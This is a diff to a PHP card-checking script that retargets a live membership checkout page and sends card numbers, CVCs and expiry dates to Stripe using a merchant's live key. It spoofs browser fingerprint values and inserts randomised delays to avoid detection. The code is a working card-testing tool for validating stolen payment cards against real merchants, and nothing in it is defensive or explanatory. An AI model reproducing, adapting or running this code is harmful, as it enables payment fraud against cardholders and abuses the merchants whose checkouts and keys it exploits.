@@ -112,7 +112,7 @@ $street = value($resposta, '"street":"', '"');
 
 // Step 1: Fetch the page to get the nonce value
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.gomsa.net/membership-account/membership-checkout/');
+curl_setopt($ch, CURLOPT_URL, 'https://www.doane.us/membership-account-new/membership-checkout/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -154,7 +154,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 // Insert simulated delay before posting form data
  sleep(rand(2, 4)); // A longer delay to simulate a pause before submission
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1f15bfea-18d9-4397-b689-3bf861b1e4178b537e&muid=fe3dce50-21e6-44ff-bc96-c235876752e42f4fd3&sid=19be9646-34a4-4d37-9bb4-7d0447645708f98229&pasted_fields=number&payment_user_agent=stripe.js%2Faa85643f31%3B+stripe-js-v3%2Faa85643f31%3B+split-card-element&referrer=https%3A%2F%2Fwww.doane.us&time_on_page=38960&client_attribution_metadata[client_session_id]=32f18293-6b8b-4af2-b47e-51014a98b627&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_168hGFAoD6Z5UbBG');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=152936c2-270c-42fc-8b9b-419d347c8a677f80b9&muid=02cd223f-04ec-4dfa-a540-2b81f331208f00654f&sid=b8bbc87d-975f-4c4f-9c58-9906dbd1324f3210fb&pasted_fields=number&payment_user_agent=stripe.js%2Ff52291c812%3B+stripe-js-v3%2Ff52291c812%3B+split-card-element&referrer=https%3A%2F%2Fwww.doane.us&time_on_page=222764&client_attribution_metadata[client_session_id]=6c5b71b2-d127-4258-8145-85b5c7f1c25e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_168hGFAoD6Z5UbBG');
 
 // Continue with the rest of the code
 $result1 = curl_exec($ch);
@@ -675,3 +675,4 @@ flush();
 //echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
+
